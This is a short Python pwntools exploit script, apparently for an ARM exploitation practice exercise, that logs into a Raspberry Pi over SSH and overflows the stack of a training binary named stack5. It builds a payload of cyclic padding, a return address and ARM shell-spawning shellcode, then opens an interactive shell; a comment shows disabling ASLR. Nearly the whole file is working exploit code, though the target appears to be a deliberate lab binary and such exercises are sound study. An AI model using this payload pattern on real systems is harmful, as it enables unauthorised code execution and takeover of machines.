# Tested on 64bit Ubuntu, macOS
# Target : 32bit ARM, Raspberry Pi, Raspbian OS
# Python 3.7.6
# pwntools 4.2.2

# import all modules/commands from pwn library
from pwn import *
import time

# disable ASLR
# echo 0 > /proc/sys/kernel/randomize_va_space

# set the context of the target platform
#  arch: arm (32bit)
#  os: linux
context.update(arch='arm', os='linux')

r = ssh(user="pi", host="host ip", port=22, password="password")
p = r.process("/home/pi/arm_exploitation/stack/stack5/stack5",
              cwd="/tmp/cpuu", env={})

payload = cyclic(cyclic_find(0x61616172))  # 68
payload += p32(0xdeadbeef)  # 0x7efffd88
payload += asm(shellcraft.sh())

p.sendline(payload)

p.interactive()

